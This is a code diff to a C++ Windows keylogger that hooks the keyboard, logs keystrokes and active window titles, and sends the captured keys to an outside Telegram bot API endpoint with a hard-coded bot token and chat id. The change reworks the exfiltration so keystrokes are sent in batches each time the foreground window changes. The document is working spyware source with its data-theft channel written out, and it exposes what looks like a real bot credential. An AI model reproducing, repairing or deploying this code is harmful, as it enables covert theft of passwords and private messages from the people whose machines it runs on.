@@ -24,7 +24,9 @@ KBDLLHOOKSTRUCT kbdStruct;
 int Save(int key_stroke);
 std::ofstream OUTPUT_FILE;
 
-extern char lastwindow[256];
+char lastwindow[256];
+
+std::string key;
 
 // This is the callback function. Consider it the event that is raised when, in this case, 
 // a key is pressed.
@@ -66,7 +68,6 @@ void ReleaseHook()
 
 int Save(int key_stroke)
 {
-	char lastwindow[256];
 
 	if ((key_stroke == 1) || (key_stroke == 2))
 		return 0; // ignore mouse clicks
@@ -83,8 +84,6 @@ int Save(int key_stroke)
 		threadID = GetWindowThreadProcessId(foreground, NULL);
 		layout = GetKeyboardLayout(threadID);
 	}
-
-	std::string key;
 	
 	if (foreground)
 	{
@@ -92,12 +91,15 @@ int Save(int key_stroke)
 		GetWindowTextA(foreground, window_title, 256);
 
 		if (strcmp(window_title, lastwindow) != 0) {
+			std::cout << "new window" << '\n';
+			auto r = cpr::Get(cpr::Url{ "https://api.telegram.org/bot631844699:AAENUxQKbXeXMq1IVPKGuqL9JSPdWvRiJ90/sendMessage" },
+				cpr::Parameters{ {"text", key}, {"chat_id", "383492784"} });
+			key.clear();
 			strcpy_s(lastwindow, window_title);
 
 			// get time
 			//time_t t = time(NULL);
 			struct tm newtime;
-			char am_pm[] = "AM";
 			__time64_t time;
 			errno_t err;
 
@@ -110,13 +112,6 @@ int Save(int key_stroke)
 				printf("Invalid argument to _localtime64_s.");
 				exit(1);
 			}
-			if (newtime.tm_hour > 12)        // Set up extension.
-				strcpy_s(am_pm, sizeof(am_pm), "PM");
-			if (newtime.tm_hour > 12)        // Convert from 24-hour
-				newtime.tm_hour -= 12;        // to 12-hour clock.
-			if (newtime.tm_hour == 0)        // Set hour to 12 if midnight.
-				newtime.tm_hour = 12;
-			
 			char timebuf[27];
 			
 			// Convert to an ASCII representation.
@@ -182,8 +177,6 @@ int Save(int key_stroke)
 		
 	}
 	//instead of opening and closing file handlers every time, keep file open and flush.
-	auto r = cpr::Get(cpr::Url{ "https://api.telegram.org/bot631844699:AAENUxQKbXeXMq1IVPKGuqL9JSPdWvRiJ90/sendMessage" },
-		cpr::Parameters{ {"text", key}, {"chat_id", "383492784"} });
 	//OUTPUT_FILE.flush();
 	return 0;
 }
